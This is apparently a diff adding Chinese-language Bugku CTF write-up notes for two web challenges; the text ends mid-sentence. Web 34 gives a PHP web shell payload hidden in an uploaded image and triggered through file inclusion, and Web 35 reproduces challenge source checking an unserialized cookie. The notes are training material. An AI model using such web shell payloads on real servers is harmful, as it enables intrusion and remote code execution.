@@ -245,3 +245,52 @@ ord($di) = A-ord($ci) #从最后产出的base64密文解密可得data的长度�
 $di = chr(A-ord($ci)) #这里可以把原本简化的A用原内容代替回来了。
 $di = chr((ord($str1)+128)-ord($ci)) #思路就是这样，然后根据这个写代码。
 ```
+
+#### Web 34
+提示：文件包含
+
+* 解题思路：既然是文件包含，一开始上来就先试试file=php://input(<?php phpinfo();?>)，提示NAIVE，不管，反正方向是对了，开burp传包才看到这个页面有个隐藏的upload.php，点进去发现是个上传点。结合apache的版本和PHP版本，没啥直接上传shell利用的机会。那就只能上传成jpg的格式，然后用文件包含去利用。http://114.67.246.176:14764/index.php?file=upload/202105140715558770.jpg，打开之后发现提示`_ @eval($_POST['shell']);_`，显然是过滤了<?php?>，换成<script>。`<script language=php>echo 'a'; eval($_POST['pass']);</script>`
+这题不错，把我一直以来没有联合使用的两种手法彻底试了试。
+
+#### Web 35
+提示：login按钮无法按
+
+* 解题思路：login按钮倒是不难解决。代码里加个`type="submit"`。post完数据之后跳转回来没有啥反应，查看源码内的CSS文件，其中有写了try?32758。`POST /?32758 `之后返回源码:
+```
+<?php
+error_reporting(0);
+$KEY='ctf.bugku.com';
+include_once("flag.php");
+$cookie = $_COOKIE['BUGKU'];
+if(isset($_GET['32758'])){
+    show_source(__FILE__);
+}
+elseif (unserialize($cookie) === "$KEY")
+{   
+    echo "$flag";
+}
+else {
+?>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Login</title>
+<link rel="stylesheet" href="admin.css" type="text/css">
+</head>
+<body>
+<br>
+<div class="container" align="center">
+  <form method="POST" action="#">
+    <p><input name="user" type="text" placeholder="Username"></p>
+    <p><input name="password" type="password" placeholder="Password"></p>
+    <p><input value="Login" type="button"/></p>
+  </form>
+</div>
+</body>
+</html>
+
+<?php
+}
+?>
+```
+这里的关键点是`unserialize($cookie) === "$KEY"`，
